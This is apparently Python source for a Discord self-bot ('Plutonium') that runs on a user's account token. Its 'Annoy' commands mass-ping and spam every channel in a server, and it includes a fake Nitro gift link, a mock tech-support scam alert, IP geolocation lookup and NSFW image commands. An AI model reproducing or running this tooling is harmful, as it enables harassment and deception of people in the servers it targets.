@plutonium.command(aliases=["house"])
async def hypesquad(ctx, house: str=None):
	if not house:
		await MsgEmbed("Please give a house name to join: (`bravery`, `brilliance`, `balance`, or `random`)", "Miscellaneous").send(ctx)
		return
	request = requests.Session()
	house = house.lower()
	payload = {}
	headers = {
	'Authorization': token,
	'Content-Type': 'application/json',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
	}    
	if house == "bravery":
		payload = {'house_id': 1}
	elif house == "brilliance":
		payload = {'house_id': 2}
	elif house == "balance":
		payload = {'house_id': 3}
	elif house == "random":
		payload = {'house_id': random.choice([1, 2, 3])}
	else:
		await MsgEmbed("Please give a valid house name! They are: `bravery`, `brilliance`, `balance`, and `random`", "Miscellaneous").send(ctx)
	try:
		response = request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
		await MsgEmbed(f"Hypesquad House has been changed! (Response Code: {response.status_code})", "Miscellaneous").send(ctx)
	except:
		await MsgEmbed("There was an error processing your hypesquad change. Please try again later.", "Miscellaneous").send(ctx)
		raise
	logitem(f"Hypesquad has been changed to {c.EC}'{house}'{c.LR}")

@plutonium.command(aliases=["toggle"])
async def embeds(ctx):
	global use_embeds
	use_embeds = not use_embeds
	data = {}
	with open("PlutoniumConfig.json", "r") as f:
		data = json.load(f)
	data["Use Embeds"] = use_embeds
	with open("PlutoniumConfig.json", "w") as f:
		json.dump(data, f, indent=4)
	await MsgEmbed("Embedded messages have been toggled.", "Miscellaneous").send(ctx)
	logitem(f"Embeds have been toggled successfully")

@plutonium.command(aliases=["delay"])
async def msgdelete(ctx, msg_del=None):
	if not msg_del:
		msg_del = 0
	global delete_delay
	try:
		delete_delay = int(msg_del) if int(msg_del) > 0 else 0
	except:
		await MsgEmbed("Please give a valid number for your delete delay.", "Miscellaneous").send(ctx)
		return
	data = {}
	with open("PlutoniumConfig.json", "r") as f:
		data = json.load(f)
	data["Delete Delay (0 = Do not delete messages)"] = delete_delay
	with open("PlutoniumConfig.json", "w") as f:
		json.dump(data, f, indent=4)
	await MsgEmbed(f"Messages will now be deleted after {delete_delay} seconds." if delete_delay > 0 else "Messages will not be deleted.", "Miscellaneous").send(ctx)
	logitem(f"Now deleting messages after {c.EC}{delete_delay}{c.LR}" + (f" ({c.EC}Messages will not delete{c.LR})" if delete_delay < 1 else ""))

@plutonium.command()
async def logging(ctx):
	global logging_enabled
	logging_enabled = not logging_enabled
	data = {}
	with open("PlutoniumConfig.json", "r") as f:
		data = json.load(f)
	data["Show Logs for all Actions"] = logging_enabled
	with open("PlutoniumConfig.json", "w") as f:
		json.dump(data, f, indent=4)
	if logging_enabled:
		await MsgEmbed("All actions that you have permission to view will now be logged to the console.", "Miscellaneous").send(ctx)
	else:
		await MsgEmbed("All actions that you have permission to view will no longer be logged to the console.", "Miscellaneous").send(ctx)

# Annoy commands

@plutonium.command()
async def ghostping(ctx):
	pass
	
@plutonium.command()
async def superping(ctx, member: discord.User=None):
	if not member:
		await MsgEmbed("Please give a valid user to super ping.", "Annoy").send(ctx)
		return
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Annoy").send(ctx)
		return
	global do_loops
	do_loops = True
	for channel in ctx.guild.text_channels:
		if not do_loops:
			return
		try:
			msg = await channel.send(member.mention)
			await msg.delete()
		except:
			pass
	logitem(f"Superpinged {c.EC}{member}{c.LR} in {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command()
async def masssend(ctx, *, message=None):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Annoy").send(ctx)
		return
	if not message:
		await MsgEmbed("Please give a message to be spammed.", "Annoy").send(ctx)
		return
	global do_loops
	do_loops = True
	for channel in ctx.guild.text_channels:
		if not do_loops:
			return
		try:
			await channel.send(message)
		except:
			pass
	logitem(f"Sent lots of messages to {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command()
async def everyonespam(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Annoy").send(ctx)
		return
	global do_loops
	do_loops = True
	for channel in ctx.guild.text_channels:
		if not do_loops:
			return
		try:
			msg = await channel.send("@everyone")
			await msg.delete()
		except:
			pass
	logitem(f"Sent @everyone to the channels in {c.EC}{ctx.guild.name}{c.LR}")

@plutonium.command()
async def spam(ctx, amount=None, *, message=None):
	try:
		times = int(amount)
	except:
		await MsgEmbed("Please give a valid number for your spam value!", "Annoy").send(ctx)
		return
	if not message:
		await MsgEmbed("Please give a message to be spammed.", "Annoy").send(ctx)
		return
	global do_loops
	do_loops = True
	for i in range(times):
		if not do_loops:
			return
		try:
			msg = await ctx.send(message)
			if delete_delay > 0:
				await msg.delete(delay=delete_delay)
		except:
			pass
	logitem(f"Spammed {c.EC}'{message}'{c.LR} {amount} times")

@plutonium.command()
async def nickspam(ctx):
	global dyn_nick
	if dyn_nick:
		dyn_nick = False
		await MsgEmbed("Dynamic nickname has been disabled.", "Annoy").send(ctx)
	else:
		await MsgEmbed("Enabling dynamic nicknames in this server.", "Annoy").send(ctx)
		dyn_nick = True
		mem = ctx.guild.get_member(plutonium.user.id)
		try:
			while dyn_nick:
				await mem.edit(nick="".join(random.choices(string.ascii_letters + string.digits, k=16)))
				await asyncio.sleep(10)
		except:
			logitem(f"Failed to change your nickname in {c.EC}{ctx.guild.name}{c.LR}")
			return

def check_valid(exam_string):
	for char in exam_string:
		if not char in string.ascii_lowercase:
			return False
	if len(exam_string) > 20:
		return False
	return True

@plutonium.command(aliases=["sreact"])
async def selfreact(ctx, message=None):
	global do_reaction_spam
	if do_reaction_spam:
		do_reaction_spam = False
		await MsgEmbed("No longer adding reactions to your messages.", "Annoy").send(ctx)
	else:
		if not message:
			await MsgEmbed("Please give a message to add to your messages.", "Annoy").send(ctx)
			return
		if check_valid(message.lower()):
			global reaction_spam_word, reaction_spam_target
			reaction_spam_target = plutonium.user.id
			reaction_spam_word = message.lower()
			do_reaction_spam = True
			await MsgEmbed("Reacting to your messages from now on.", "Annoy").send(ctx)
		else:
			await MsgEmbed("Please ensure your message only contains the alphabet. Spaces are not allowed.", "Annoy").send(ctx)

@plutonium.command(aliases=["reaction"])
async def react(ctx, user: discord.User=None, message=None):
	global do_reaction_spam
	if do_reaction_spam:
		do_reaction_spam = False
		await MsgEmbed("No longer adding reactions to messages.", "Annoy").send(ctx)
	else:
		if not user:
			await MsgEmbed("Please give a user to add your reactions to.", "Annoy").send(ctx)
			return
		if not message:
			await MsgEmbed("Please give a message to add to the user's messages.", "Annoy").send(ctx)
			return
		if check_valid(message.lower()):
			global reaction_spam_word, reaction_spam_target
			reaction_spam_target = user.id
			reaction_spam_word = message.lower()
			do_reaction_spam = True
			await MsgEmbed(f"Reacting to **{user}**'s messages from now on.", "Annoy").send(ctx)
		else:
			await MsgEmbed("Please ensure your message only contains the alphabet. Spaces are not allowed.", "Annoy").send(ctx)

@plutonium.command()
async def wall(ctx):
	await ctx.send("**" + "\n" * 1996 + "**")

@plutonium.command()
async def copy(ctx, user: discord.User=None):
	global copy_user_id
	if not user or user == plutonium.user:
		copy_user_id = 0
		await MsgEmbed("No longer copying what anyone says.", "Annoy").send(ctx)
		logitem("Disabled copying of user messages")
		return
	copy_user_id = user.id
	await MsgEmbed(f"Now copying what {user} says!", "Annoy").send(ctx)
	logitem(f"Copying everything that {c.EC}{user}{c.LR} says")

@plutonium.command()
async def arabic(ctx):
	await ctx.send("﷽" * 2000)

# Utility commands

@plutonium.command()
async def uptime(ctx):
	await MsgEmbed(f"**Bot Uptime:** {str(datetime.timedelta(seconds=time.perf_counter() - uptime_start)).split('.')[0]}", "Utility").send(ctx)

@plutonium.command(aliases=["iplookup", "geoip"])
async def ip(ctx, target=None):
	if not target:
		await MsgEmbed("Please give a valid IP Address to lookup!", "Utility").send(ctx)
		return
	query = f"http://ip-api.com/json/{target}?fields=status,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,org,as,mobile,proxy,hosting,query"
	info = requests.get(query).json()
	logitem(f"IP Lookup query complete")
	for item in info:
		if info[item] == "":
			info[item] = "None"
	embed = StdEmbed()
	embed.title = f"IP Lookup for '{target}'"
	if info['status'] == "fail":
		embed.description = f"IP Lookup failed. Please give a valid IP Address.\n**Query:** {target}\n**API Response:** 'fail'"
		await embed.send(ctx)
		return
	else:
		embed.description = f"IP Lookup completed successfully!\n**Query:** {target}\n**API Response:** 'success'"
	embed.add_field(name="Country", value=f"{info['country']} ({info['countryCode']})", inline=True)
	embed.add_field(name="Continent", value=info['continent'], inline=True)
	embed.add_field(name="Currency", value=info['currency'], inline=True)
	embed.add_field(name="Region", value=f"{info['regionName']} ({info['region']})", inline=True)
	embed.add_field(name="City", value=info['city'], inline=True)
	embed.add_field(name="District", value=info['district'], inline=True)
	embed.add_field(name="Zip Code", value=info['zip'], inline=True)
	embed.add_field(name="Latitude", value=info['lat'], inline=True)
	embed.add_field(name="Longitude", value=info['lon'], inline=True)
	embed.add_field(name="Time Zone", value=info['timezone'].replace("_", " "), inline=False)
	embed.add_field(name="ISP", value=info['isp'], inline=False)
	embed.add_field(name="Organization", value=info['org'], inline=False)
	embed.add_field(name="AS", value=info['as'], inline=False)
	embed.add_field(name="Mobile", value=info['mobile'], inline=True)
	embed.add_field(name="Hosting Service", value=info['hosting'], inline=True)
	embed.add_field(name="Proxy/VPN/Tor", value=info['proxy'], inline=True)
	await embed.send(ctx)
	logitem(f"Sent IP Lookup information to channel")

@plutonium.command()
async def snipe(ctx):
	if not ctx.channel.id in snipe_data:
		await MsgEmbed("There is nothing here to snipe!", "Utility").send(ctx)
	else:
		await MsgEmbed(f"**{snipe_data[ctx.channel.id][1]}:** {snipe_data[ctx.channel.id][0]}", "Utility").send(ctx)

@plutonium.command()
async def ping(ctx):
	await MsgEmbed(f"Plutonium SelfBot - Ping\n\n**SelfBot Latency:** {round(plutonium.latency * 1000)}ms", "Utility").send(ctx)

@plutonium.command()
async def prefix(ctx, pre=None):
	if not pre:
		await MsgEmbed("Please give a prefix for the bot!", "Utility").send(ctx)
		return
	data = {}
	with open("PlutoniumConfig.json", "r") as f:
		data = json.load(f)
	data['Bot Prefix'] = pre
	with open("PlutoniumConfig.json", "w") as f:
		json.dump(data, f, indent=4)
	await MsgEmbed("Prefix updated. Please restart the bot for this to take effect.", "Utility").send(ctx)
	logitem(f"Bot prefix changed to {c.EC}{pre}{c.LR}")

@plutonium.command()
async def shutdown(ctx):
	await MsgEmbed("Shutting down Plutonium SelfBot!", "Utility").send(ctx)
	global plutonium
	logitem(f"Shutting down {c.EC}Plutonium SelfBot{c.LR}...")
	await plutonium.logout()

@plutonium.command()
async def restart(ctx):
	await MsgEmbed("Restarting Plutonium SelfBot!", "Utility").send(ctx)
	global plutonium
	logitem(f"Restarting {c.EC}Plutonium SelfBot{c.LR}...")
	global restart_bot
	restart_bot = True
	await plutonium.logout()

@plutonium.command()
async def clock(ctx):
	await MsgEmbed(f"It is currently {datetime.datetime.now().strftime('%I:%M:%S %p - %A, %B %d, %Y')}", "Utility").send(ctx)

@plutonium.command(aliases=["stop", "end"])
async def cancel(ctx):
	global do_loops
	do_loops = False
	await MsgEmbed("All current pending actions have been cancelled.", "Utility").send(ctx)
	logitem("Cancelled all pending actions inside of loops.")

@plutonium.command()
async def countdown(ctx, length=None):
	try:
		t = int(length)
	except:
		await MsgEmbed("Please give a valid number for your countdown.", "Utility").send(ctx)
		return
	if t < 1:
		await MsgEmbed("Please give a valid length for the countdown.", "Utility").send(ctx)
		return
	global do_loops
	do_loops = True
	msg = await ctx.send(f":alarm_clock: Countdown: {t} seconds remaining.")
	while t > 1:
		if not do_loops:
			await msg.edit(content=f":alarm_clock: Countdown stopped forcefully.")
			return
		t -= 1
		await asyncio.sleep(1)
		await msg.edit(content=f":alarm_clock: Countdown: {t} seconds remaining.")
	await msg.edit(content=f":alarm_clock: Countdown: Your countdown is complete!")
	logitem("Countdown complete!")

@plutonium.command()
async def leave(ctx):
	if not ctx.guild:
		await MsgEmbed("You have to be in a guild to do that!", "Utility").send(ctx)
		return
	try:
		await ctx.guild.leave()
		logitem(f"Left guild {c.EC}{ctx.guild.name}{c.LR}")
	except:
		pass

@plutonium.command()
async def whsend(ctx, hook=None, msg=None):
	if not hook:
		await MsgEmbed("Please give a webhook to send your message to!", "Utility").send(ctx)
		return
	if not msg:
		await MsgEmbed("Please give a message to send to the webhook!", "Utility").send(ctx)
		return
	if await webhook_send(hook, msg):
		await MsgEmbed("Message sent successfully", "Utility").send(ctx)
	else:
		await MsgEmbed("The message was not able to be sent. Please check that the webhook is valid and try again.", "Utility").send(ctx)

@plutonium.command()
async def devmode(ctx):
	global dev_mode
	dev_mode = not dev_mode
	if dev_mode:
		await MsgEmbed("Developer mode has been enabled.", "Utility").send(ctx)
		logitem("Now showing all errors and stack traces to the console.")
	else:
		await MsgEmbed("Developer mode has been disabled.", "Utility").send(ctx)
		logitem("Hiding errors and stack traces.")

# Fun commands

@plutonium.command(aliases=["gift"])
async def nitro(ctx):
	code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
	await ctx.send(f"https://discord.gift/{code}")

# Reference to the LulzSec call - https://www.youtube.com/watch?v=U9aHTXKTmfs
lulzsec_quotes = ["The FBI is closed until further notice. Please redirect your Flame Botnet on our DNS servers.", "\"Where are you located?\" - Botnet.", "This is in reference to Red Shield Five, Flame Net.", "I need to be forwarded to Dan Siebels. He's got a bulletproof plaque, he drinks Sprite, I know he's there.", "I do represent an agency... HTP.", "This botnet utilizes rainbow tables. This allows the cryptography inside of the botnet to be cracked.", "Alright I’d like to give you THE AUTHENTICATION CODE!", "Shut it down, Charlie Brown.", "A self replicating Flame Botnet has been reported in Sector Alpha.", "Swatnet, Botnet. Tango down!"]
@plutonium.command(aliases=["swatnet", "botnet", "flame"])
async def lulzsec(ctx):
	await MsgEmbed(random.choice(lulzsec_quotes) + "\nhttps://www.youtube.com/watch?v=U9aHTXKTmfs", "Swatnet! Botnet!").send(ctx)

rickroll_bait = ["10 celebrities who passed away in last night's tragic airline crash:", "White-Horned Rhinos now declared extinct as diseases spread through zoos in New York, Los Angeles, and others:", "Sacramento Dog breeder facing charges for not feeing any of her pets for 10 days:"]
@plutonium.command()
async def rickroll(ctx):
	await MsgEmbed(random.choice(rickroll_bait) + "\nhttps://www.youtube.com/watch?v=dQw4w9WgXcQ", "Fun").send(ctx)

@plutonium.command()
async def fatass(ctx, user: discord.User=None):
	if user:
		await ctx.send(user.mention)
	await ImgEmbed("https://i.makeagif.com/media/2-14-2017/EquUyH.gif", "Fun").send(ctx)

@plutonium.command(aliases=["rashid"])
async def virus(ctx, user: discord.User=None):
	if not user:
		await MsgEmbed(f"Please give a valid user.", "Fun").send(ctx)
		return
	await ctx.send(user.mention)
	await MsgEmbed("ATTENTION! YOUR COMPUTER IS INFECTED!\nYOUR FILES ARE NOW BEING DELETED. PLEASE CALL +1-(800)-195-1826 IMMEDIATELY!\n\nTHIS IS HOTLINE FOR TECHNICAL SUPPORT #1. YOU WILL NOT REGRET YOUR ACTIONS IN SERVICE WITH US. PROTECT YOUR DATA AND CALL NOW!!!", "URGENT TECHNICAL WARNING!").send(ctx)

@plutonium.command()
async def cancer(ctx):
	headers = {'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7', 'Content-Type': 'application/json', 'Authorization': token,}
	request = requests.Session()
	modes = itertools.cycle(["light", "dark"])
	logitem(f"Changing display modes using the canary API...")
	for _ in range(10):
		setting = {"theme": next(modes)}
		request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)


	
split_bar = "o--------------------o"
@plutonium.command()
async def lyrics(ctx, artist=None, song=None):
	if not artist or not song:
		await MsgEmbed(f"Please make sure you included the artist and the song you want to lookup. Make sure quotes are used.\nSpecial usage: `{bot_prefix}lyrics \"<artist>\" \"<song>\"`", "Fun").send(ctx)
		return
	re = requests.get(f"https://api.lyrics.ovh/v1/{artist}/{song}")
	data = re.json()
	full = data['lyrics']
	if full == "":
		await MsgEmbed("Song or artist could not be found. Please try again.", "Fun").send(ctx)
		logitem(f"Failed to perform lyrics API request - {c.EC}Unkown Song.{c.LR}")
		return
	verses = full.replace("\n\n", "\n").split("\n\n")
	await ctx.send(split_bar)
	for verse in verses:
		await ctx.send(f"{split_bar}\n{verse}")
	await ctx.send(split_bar)
	logitem("Song has been displayed.")

responses = ['That is a resounding no', 'It is not looking likely', 'Too hard to tell', 'It is quite possible', 'That is a definite yes!', 'Maybe', 'There is a good chance']
@plutonium.command()
async def ball(ctx, *, msg=None):
	if not msg:
		await MsgEmbed("Please give a message for the 8 Ball to evaluate!", "Fun").send(ctx)
		return
	embed = StdEmbed()
	embed.add_field(name="Question:", value=f"```{msg}```", inline=False)
	embed.add_field(name="Answer:", value=f"```{random.choice(responses)}```", inline=False)
	embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
	await embed.send(ctx)

# Text commands

@plutonium.command()
async def blank(ctx):
	await ctx.send("** **")

@plutonium.command(aliases=["len"])
async def length(ctx, *, message=None):
	if not message:
		await MsgEmbed(f"Please give a message to find the length of.", "Text").send(ctx)
		return
	await MsgEmbed(f"Your message is {len(message.split(' '))} words long and {len(message)} characters long.", "Text").send(ctx)

# Requires an API key at https://www.perspectiveapi.com. Follow the instructions and place the
# key you get from Google Cloud in the config if you want to use this command, but it is optional. 
# It includes a short verification process and really isn't necessary but enable it if you want to.
# You will also need to install this: https://github.com/googleapis/google-api-python-client
valid_attributes = {"TOXICITY", "SEVERE_TOXICITY", "IDENTITY_ATTACK", "INSULT", "PROFANITY", "THREAT", "SEXUALLY_EXPLICIT", "FLIRTATION"}
attribute_msg = "Please give a valid attribute. They are: `TOXICITY`, `SEVERE_TOXICITY`, `IDENTITY_ATTACK`, `INSULT`, `PROFANITY`, `THREAT`, `SEXUALLY_EXPLICIT`, and `FLIRTATION`"
@plutonium.command()
async def rate(ctx, attribute: str=None, *, message: str=None):
	if not use_google_api:
		await MsgEmbed("You do not have the correct packages installed to do that!", "Text").send(ctx)
		return
	if not attribute:
		await MsgEmbed(attribute_msg, "Text").send(ctx)
		return
	if not message:
		await MsgEmbed("Please provide a message to analyze.", "Text").send(ctx)
		return
	attribute = attribute.upper()
	if not attribute in valid_attributes:
		await MsgEmbed(attribute_msg, "Text").send(ctx)
		return
	try:
		api_call = {"comment": {"text": message}, 'requestedAttributes': {attribute: {}}}
		response = service.comments().analyze(body=api_call).execute()
		logitem(f"Rate command API request complete")
	except:
		await MsgEmbed(f"There was an error making the API Request.\n**Message:** {message}\n**Requested Attribute:** {attribute}", "Text").send(ctx)
		return
	try:
		value = response["attributeScores"][attribute]["summaryScore"]["value"]
	except:
		await MsgEmbed(f"There was an error extracting data from the API Response.\n**Message:** {message}\n**Requested Attribute:** {attribute}", "Text").send(ctx)
		return
	await MsgEmbed(f"Rating value for your message:\n**Message:** {message}\n**Requested Attribute:** {attribute}\n\n**Result (Percentage):** {round(value * 100, 1)}%", "Text").send(ctx)

digits = {1:"one",2:"two",3:"three",4:"four",5:"five",6:"six",7:"seven",8:"eight",9:"nine",0:"zero"}
@plutonium.command(aliases=["bletters", "blocks"])
async def blockletters(ctx, *, text=None):
	if not text:
		await MsgEmbed("Please give a message to convert to block letteres!", "Text").send(ctx)
		return
	text = text.lower()
	out_msg = ""
	for char in text:
		if char in string.ascii_lowercase:
			out_msg += f":regional_indicator_{char}:"
		elif char in string.digits:
			out_msg += f":{digits[int(char)]}:"
		elif char == " ":
			out_msg += "   "
	await MsgEmbed(out_msg, "Text").send(ctx)

@plutonium.command()
async def password(ctx):
	password = "".join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=16))
	await MsgEmbed(f"Here, have a randomly generated password:\n```{password}```", "Text").send(ctx)

# Image commands

vince_gifs = ["https://i.imgur.com/QQeZcZL.gif", "https://i.imgur.com/hd7rC6V.gif", "https://media.tenor.com/images/2a3353dd42660543b6da07e080de6624/tenor.gif", "https://media1.tenor.com/images/5ef87c5c307a1d5a42a6e8ca2a8f8986/tenor.gif", "https://i.gifer.com/MB7z.gif", "https://thumbs.gfycat.com/AromaticInexperiencedCod-size_restricted.gif"]
@plutonium.command()
async def vince(ctx):
	await ImgEmbed(random.choice(vince_gifs), "Image").send(ctx)

sake_imgs = ["https://www.thespruceeats.com/thmb/-cRq9hc367oORzrKQq79wVqbP1k=/3432x2574/smart/filters:no_upscale()/GettyImages-561129715-56a541ee5f9b58b7d0dbeda9.jpg", "https://www.liquor.com/thmb/TCkUbpitHupTzTOoHDbcLLe_8_Y=/720x540/smart/filters:no_upscale()/__opt__aboutcom__coeus__resources__content_migration__liquor__2018__10__24154949__Everything-You-Need-to-Know-About-Warm-Sake-Including-Why-Its-Pretty-Darn-Good-720x720-article-d5cddc8cd31d46f892f1d1ee2c541e4f.jpg", "https://www.nippon.com/en/ncommon/contents/guide-to-japan/1797/1797.jpg", "https://assets3.thrillist.com/v1/image/2731317/414x310/crop;jpeg_quality=65.jpg", "https://hips.hearstapps.com/amv-prod-gp.s3.amazonaws.com/gearpatrol/wp-content/uploads/2017/05/Sake-Sushi-Pairings-Gear-Patrol-Lead-Full.jpg"]
@plutonium.command()
async def sake(ctx):
	await ImgEmbed(str(random.choice(sake_imgs)), "Image").send(ctx)

@plutonium.command()
async def sakebomb(ctx):
	await ImgEmbed("https://media1.tenor.com/images/f71a2c08eda596f7e383c8131deb8cb2/tenor.gif", "Sake Bomb").send(ctx)

doordash_texts = ["https://memeguy.com/photos/images/order-from-doordash-they-said-itll-be-fun-they-said-373123.jpg", "https://i.redd.it/rq155rxtd0b51.jpg", "https://i.redd.it/cu8tfozk5td51.jpg", "https://cdn.ebaumsworld.com/mediaFiles/picture/2207832/85887530.jpg", "https://imageproxy.ifunny.co/crop:x-20,resize:640x,quality:90x75/images/dabecc0a1fd6cd93c86bbddf789ca6cd1ab15305e987466e89ab1467d0362814_1.jpg", "https://img.ifunny.co/images/78f85aa9437f6c36d1a8dc2498c74ea9be8cbcd051359ff80f9bc2a7c0ec3aea_1.jpg", "https://img.ifunny.co/images/119dfaf3c8a8a254b57c69df5493ee9385ac0502292a960e5923d998939e9740_1.jpg", "https://i.kinja-img.com/gawker-media/image/upload/c_fill,f_auto,fl_progressive,g_center,h_675,pg_1,q_80,w_1200/snxbvi4nfhw2u4kubjgl.jpg"]
@plutonium.command()
async def doordash(ctx):
	await ImgEmbed(str(random.choice(doordash_texts)), "Image").send(ctx)

@plutonium.command()
async def pognt(ctx):
	await ImgEmbed("https://media.tenor.com/images/37601cf94850da7fb8d3c914e1bcfdca/tenor.gif", "Image").send(ctx)

@plutonium.command()
async def wallop(ctx):
	await ImgEmbed("http://peepholejournal.tv/issue-data/09/02-cencic/shot.gif", "Image").send(ctx)
	
@plutonium.command()
async def water(ctx):
	await ImgEmbed("https://cdn.discordapp.com/attachments/805849632894353418/807799334271582218/unknown.png", "Cave Water").send(ctx)

@plutonium.command()
async def griffer(ctx):
	await ImgEmbed("https://cdn.discordapp.com/attachments/805620883855114270/808524452936679425/3C951EE4-7E28-4610-BA2D-09ED43A4B183.jpeg", "Idiot").send(ctx)

@plutonium.command()
async def dan(ctx):
	await ImgEmbed("https://cdn.discordapp.com/attachments/811775862709813268/812882297719357480/image0.png", "Image").send(ctx)

@plutonium.command()
async def clyde(ctx, *, message=None):
	if not message:
		await MsgEmbed(f"Please include text for clyde to say.", "Image").send(ctx)
		return
	response = requests.get(f"https://nekobot.xyz/api/imagegen?type=clyde&text={message}").json()
	if response['success']:
		await ImgEmbed(response['message'], "Image").send(ctx)
	else:
		await MsgEmbed(f"Something went wrong: {response['message']} ({response['status']})", "Image").send(ctx)
	
@plutonium.command()
async def changemymind(ctx, *, message=None):
	if not message:
		await MsgEmbed(f"Please include your text to change someone's mind.", "Image").send(ctx)
		return
	response = requests.get(f"https://nekobot.xyz/api/imagegen?type=changemymind&text={message}").json()
	if response['success']:
		await ImgEmbed(response['message'], "Image").send(ctx)
	else:
		await MsgEmbed(f"Something went wrong: {response['message']} ({response['status']})", "Image").send(ctx)
	
@plutonium.command()
async def iphone(ctx, *, url=None):
	if not url:
		await MsgEmbed(f"Please include an image url to go in your iPhone.", "Image").send(ctx)
		return
	response = requests.get(f"https://nekobot.xyz/api/imagegen?type=iphonex&url={url}").json()
	if response['success']:
		await ImgEmbed(response['message'], "Image").send(ctx)
	else:
		await MsgEmbed(f"Something went wrong: {response['message']} ({response['status']})", "Image").send(ctx)

@plutonium.command()
async def trump(ctx, *, message=None):
	if not message:
		await MsgEmbed(f"Please include an image url to go in your iPhone.", "Image").send(ctx)
		return
	response = requests.get(f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={message}").json()
	if response['success']:
		await ImgEmbed(response['message'], "Image").send(ctx)
	else:
		await MsgEmbed(f"Something went wrong: {response['message']} ({response['status']})", "Image").send(ctx)

@plutonium.command()
async def tweet(ctx, user: discord.User=None, *, message=None):
	if not user:
		await MsgEmbed(f"Please give the user who will send the tweet.", "Image").send(ctx)
		return
	if not message:
		await MsgEmbed(f"Please include a message to send with the tweet.", "Image").send(ctx)
		return
	response = requests.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={user.name}&text={message}").json()
	if response['success']:
		await ImgEmbed(response['message'], "Image").send(ctx)
	else:
		await MsgEmbed(f"Something went wrong: {response['message']} ({response['status']})", "Image").send(ctx)

@plutonium.command()
async def phcomment(ctx, user: discord.User=None, *, message=None):
	if not user:
		await MsgEmbed(f"Please give the user who will write the comment", "Image").send(ctx)
		return
	if not message:
		await MsgEmbed(f"Please include a message to send in the comment.", "Image").send(ctx)
		return
	response = requests.get(f"https://nekobot.xyz/api/imagegen?type=phcomment&image={user.avatar_url}&username={user.name}&text={message}").json()
	if response['success']:
		await ImgEmbed(response['message'], "Image").send(ctx)
	else:
		await MsgEmbed(f"Something went wrong: {response['message']} ({response['status']})", "Image").send(ctx)

@plutonium.command()
async def mock(ctx, *, message=None):
	if not message:
		await MsgEmbed(f"Please give a message to mock.", "Text").send(ctx)
		return
	end = ""
	for index, letter in enumerate(message.lower()):
		try:
			if index % 2 == 0:
				end += letter.upper()
			else:
				end += letter
		except:
			pass
	await ctx.send(end)

# NSFW Commands

async def do_nsfw(ctx, img_string):
	try:
		response = requests.get(f"https://nekos.life/api/v2/img/{img_string}")
		url = response.json()['url']
		await ImgEmbed(url, f"NSFW: {img_string}").send(ctx)
	except:
		await MsgEmbed("There was an error getting your NSFW image. Please try again.", "NSFW").send(ctx)

@plutonium.command()
async def anal(ctx):
	await do_nsfw(ctx, "anal")

@plutonium.command()
async def erofeet(ctx):
	await do_nsfw(ctx, "erofeet")

@plutonium.command()
async def feet(ctx):
	await do_nsfw(ctx, "feetg")

@plutonium.command()
async def hentai(ctx):
	await do_nsfw(ctx, "Random_hentai_gif")

@plutonium.command()
async def boobs(ctx):
	await do_nsfw(ctx, "boobs")

@plutonium.command()
async def cum(ctx):
	await do_nsfw(ctx, "cum")

@plutonium.command()
async def solo(ctx):
	await do_nsfw(ctx, "solo")

@plutonium.command()
async def futa(ctx):
	await do_nsfw(ctx, "futanari")

@plutonium.command()
async def spank(ctx):
	await do_nsfw(ctx, "spank")

@plutonium.command()
async def trap(ctx):
	await do_nsfw(ctx, "trap")

@plutonium.command()
async def foxgirl(ctx):
	await do_nsfw(ctx, "fox_girl")

@plutonium.command()
async def pussy(ctx):
	await do_nsfw(ctx, "pussy")

@plutonium.command()
async def blowjob(ctx):
	await do_nsfw(ctx, "blowjob")

@plutonium.command()
async def lewdneko(ctx):
	await do_nsfw(ctx, "nsfw_neko_gif")

@plutonium.command()
async def lesbian(ctx):
	await do_nsfw(ctx, "les")

@plutonium.command()
async def feed(ctx):
	await do_nsfw(ctx, "feed")

@plutonium.command()
async def tickle(ctx):
	await do_nsfw(ctx, "tickle")

@plutonium.command()
async def slap(ctx):
	await do_nsfw(ctx, "slap")

@plutonium.command()
async def poke(ctx):
	await do_nsfw(ctx, "poke")

@plutonium.command()
async def hug(ctx):
	await do_nsfw(ctx, "hug")

@plutonium.command()
async def smug(ctx):
	await do_nsfw(ctx, "smug")

@plutonium.command()
async def pat(ctx):
	await do_nsfw(ctx, "pat")

@plutonium.command()
async def kiss(ctx):
	await do_nsfw(ctx, "kiss")

@plutonium.command()
async def femdon(ctx):
	await do_nsfw(ctx, "femdom")

plutonium.run(token, bot=False)
if restart_bot and not os.name == "nt":
	# Sucks to suck, I don't have windows so people on windows can't have nice things around here
	os.system("cd \"${0%/*}\"; python3 Plutonium.py; exit")

			       
			       
			       #sake
